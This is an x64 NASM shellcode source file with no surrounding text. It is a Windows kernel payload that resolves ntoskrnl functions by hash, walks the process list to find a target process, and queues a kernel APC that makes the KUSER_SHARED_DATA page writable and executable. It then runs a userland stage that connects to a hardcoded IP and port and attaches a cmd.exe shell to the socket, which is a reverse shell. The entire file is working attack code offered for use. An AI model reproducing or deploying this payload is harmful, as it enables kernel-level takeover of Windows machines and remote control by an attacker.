BITS 64

USERLAND_SHELLCODE_LEN equ end_payload - copied_to_userland
PSGETTHREADTEB_HASH equ 0xcef84c3e
PSGETCURRENTPROCESS_HASH equ 0xdbf47c78
PSGETPROCESSIMAGEFILENAME_HASH equ 0x77645f3f
PSGETPROCESSID_HASH equ 0x170114e1
KEINITIALIZEAPC_HASH equ 0x6d195cc4
KEINSERTQUEUEAPC_HASH equ 0xafcc4634
PROCESSNAME_HASH equ 0x3ee083d8
;PROCESSNAME_HASH equ 0x4f070ab7
CREATEPROCESS_HASH equ 0xf390b59f
WSASTARTUP_HASH equ 0x6e59dfe7
WSASOCKET_HASH equ 0x4ecd6fa8
CONNECT_HASH equ 0xcf630557

THREADLISTHEAD_OFF equ 0
THREADLISTENTRY_OFF equ 0x8
QUEUE_OFF equ 0x10
KAPC_OFF equ 0x18

; Copy userland payload
mov r13, 0xfffff78000000f00
mov rdi, 0xfffff78000000800
lea rsi, [rel copied_to_userland]
mov ecx,  USERLAND_SHELLCODE_LEN
rep movsb

mov rdi, [gs:0x38] ; IdtBase
mov rdi, [rdi+0x4] 
shr rdi, 12
shl rdi, 12

_search_header_loop:
  sub rdi, 0x1000
  cmp word [rdi], 0x5a4d ; MZ
  jne _search_header_loop

; Get the offset of _KTHREAD.Queue
; +0x0b0 Queue : Ptr64 _KQUEUE
; +0x0b8 Teb : Ptr64 Void
mov r15d, PSGETTHREADTEB_HASH
call search_api_in_mod
mov eax, [rax+3] ; mov rax, qword ptr [rcx+0xYYYY]
sub eax, 8
mov [r13+QUEUE_OFF], eax

mov r15d, PSGETCURRENTPROCESS_HASH
call call_api_in_mod
xchg rcx, rax

; rcx = the offset of EPROCESS.ImageFilename
mov r15d, PSGETPROCESSIMAGEFILENAME_HASH
call search_api_in_mod
mov ebx, [rax+3] ; mov rax, qword ptr [rcx+0xYYYY]

; rdx = the offset of EPROCESS.ThreadListHead
lea rdx, [rbx+0x28] 
mov [r13+THREADLISTHEAD_OFF], edx

; rbp = the current _ETHREAD
mov rbp, [gs:0x188]

; Calc the offset of ETHREAD.ThreadListEntry
lea rdx, [rcx+rdx] ; rdx = &EPROCESS.ThreadListHead
_search_thread_loop:
  mov rdx, [rdx]
  mov rax, rdx
  sub rax, rbp
  cmp rax, 0x500
  ja _search_thread_loop
mov [r13+THREADLISTENTRY_OFF], eax

; Get the offset of ActiveProcessLinks
; +0x180 UniqueProcessId : Ptr64 Void
; +0x188 ActiveProcessLinks : _LIST_ENTRY
mov r15d, PSGETPROCESSID_HASH
call search_api_in_mod
mov edx, [rax+3] ; mov rax, qword ptr [rcx+0xYYYY]
add edx, 8 

_search_process_loop:
  lea rsi, [rcx+rbx]
  call compute_hash
  cmp eax, PROCESSNAME_HASH
  je _found_process
  mov rcx, [rcx+rdx]
  sub rcx, rdx
  jmp _search_process_loop

_found_process:
mov ebp, [r13+THREADLISTHEAD_OFF]
add rbp, rcx
mov rbx, rbp

_iterate_thread_loop:
  mov rbp, [rbp+8]
  cmp rbx, rbp
  je _iterate_thread_loop
  mov rdx, rbp
  sub rdx, [r13+THREADLISTENTRY_OFF]
  mov eax, [r13+QUEUE_OFF]
  add rax, rdx
  cmp qword [rax], 0
  je _iterate_thread_loop

  lea rcx, [r13+KAPC_OFF]
  xor r8, r8
  lea r9, [rel kernel_routine]
  push r13
  push byte +1
  push dword 0x7ffe0800
  push r8
  sub rsp, 0x20
  mov r15d, KEINITIALIZEAPC_HASH
  call call_api_in_mod

  xor r9, r9
  xor rdx, rdx 
  lea rcx, [r13+KAPC_OFF]
  mov r15d, KEINSERTQUEUEAPC_HASH
  call call_api_in_mod
  add rsp, 0x40  
  test eax, eax
  je _iterate_thread_loop

  mov rax, [r13+KAPC_OFF+0x10]
  cmp byte [rax+0x1a], 1
  je _infinite_loop

  mov [rax], rax
  mov [rax+8], rax  
  jmp _iterate_thread_loop

  ; Since this thread which we have taken control of is preemptive, 
  ; there is no need for restoration. 
_infinite_loop:
  jmp _infinite_loop

kernel_routine: 
  ; Setup the PTE of KUSER_SHARED_DATA
  mov rax, 0xfffff680003fff00
  or byte [rax], 0x2
  and byte [rax+7], +0x7f
  ret
  
copied_to_userland: ; userland shellcode also needs snippets below
userland_shellcode:
  mov rdi, [gs:0x60]
  mov r15d, WSASTARTUP_HASH
  call get_api
  xchg r12, rax

  mov r15d, WSASOCKET_HASH
  call get_api
  xchg r13, rax

  mov r15d, CONNECT_HASH
  call get_api
  xchg r14, rax

  sub rsp, 0x2a0

  xor esi, esi
  xor eax, eax
  lea rdi, [rsp+0x58]
  mov ecx, 0x60
  rep stosb

  lea rdx, [rsp+0xf0]
  mov ecx, 0x0202
  call r12 ; WSAStartup

  push byte 2
  pop rdi
  lea edx, [rsi+1]    ; type
  mov ecx, edi        ; af
  xor r9, r9          ; lpProtocolInfo
  xor r8, r8          ; protocol
  mov [rsp+0x28], esi ; dwFlags
  mov [rsp+0x20], esi ; g
  call r13 ; WSASocketA
  xchg rbx, rax

  mov [rsp+0xd8], di ; sin_family
  mov dword [rsp+0xdc], 0x0138a8c0 ; s_addr
  mov word [rsp+0xda], 0x5c11  ; sin_port
  lea r8d, [rsi+0x10] ; namelen
  lea rdx, [rsp+0xd8] ; name
  mov rcx, rbx ; sock
  call r14 ; connect

  lea rdx, [rel str_cmd]
  xor r8, r8 ; lpProcessAttributes
  xor r9, r9 ; lpThreadAttributes
  xor ecx, ecx ; lpApplicationName

  lea rax, [rsp+0xc0]  
  mov [rsp+0x48], rax ; lpProcessInformation
  lea rax, [rsp+0x50]
  mov [rsp+0x40], rax ; lpStartupInfo
  mov [rsp+0x38], rsi ; lpCurrentDirectory
  mov [rsp+0x30], rsi ; lpEnvironment
  mov [rsp+0x28], esi  ; dwCreationFlags
  mov dword [rsp+0x20], 1 ; bInheritHandles

  mov [rsp+0x90], si
  mov [rsp+0xA0], rbx ; hStdInput
  mov [rsp+0xA8], rbx ; hStdOutput
  mov [rsp+0xB0], rbx ; hStdError
  mov dword [rsp+0x50], 0x68 ; cb
  mov dword [rsp+0x8C], 0x101 ; dwFlags

  mov rdi, [gs:0x60]
  mov r15d, CREATEPROCESS_HASH
  call call_api

  ; Again, there is no need for restoration
_infinite_loop2:
  jmp _infinite_loop2

str_cmd : db 'cmd', 0

call_api_in_mod:
  call search_api_in_mod
  jmp rax

compute_hash: ; rsi = buf
  push rdi
  xor rdi, rdi
  xor rax, rax
_hash_loop:
    ror edi, 13
    lodsb
    add edi, eax
    test al, al
    jne _hash_loop
  xchg rax, rdi
  pop rdi
  ret

search_api_in_mod: ; rdi = DllBase, r15 = hash
  push rdi
  push rsi
  push rbx
  push rcx
  push rdx
  push rbp
  mov ecx, [rdi+0x3c] ; e_lfanew
  mov ebp, [rdi+rcx+0x88] ; IMAGE_EXPORT_DIRECTORY
  add rbp, rdi
  mov ecx, [rbp+0x18] ; NumberOfNames
  mov ebx, [rbp+0x20] ; AddressOfNames
  add rbx, rdi
_traverse_name:
    jecxz _name_not_found
    dec rcx
    mov esi, [rbx+rcx*4]
    add rsi, rdi
    call compute_hash
    cmp eax, r15d
    jnz _traverse_name
; name found
  mov ebx, [rbp+0x24] ; AddressOfNameOrdinals
  add rbx, rdi
  mov cx, [rbx+rcx*2] 
  mov ebx, [rbp+0x1c]
  add rbx, rdi
  mov eax, [rbx+rcx*4]
  add rax, rdi
  jmp _finalize
_name_not_found:
  xor rax, rax
_finalize:
  pop rbp
  pop rdx
  pop rcx
  pop rbx
  pop rsi
  pop rdi
  ret
  
get_api: ; rdi = PEB, r15 = hash
  push rdi
  push r14
  mov rdi, [rdi+0x18]       ; Ldr
  mov r14, [rdi+0x20]       ; InMemoryOrderModuleList
_traverse_mod:
  mov r14, [r14]
  mov rdi, [r14+0x20] ; DllBase
  call search_api_in_mod
  test rax, rax
  je _traverse_mod
  pop r14
  pop rdi
  ret

call_api:
  call get_api
  jmp rax

end_payload:
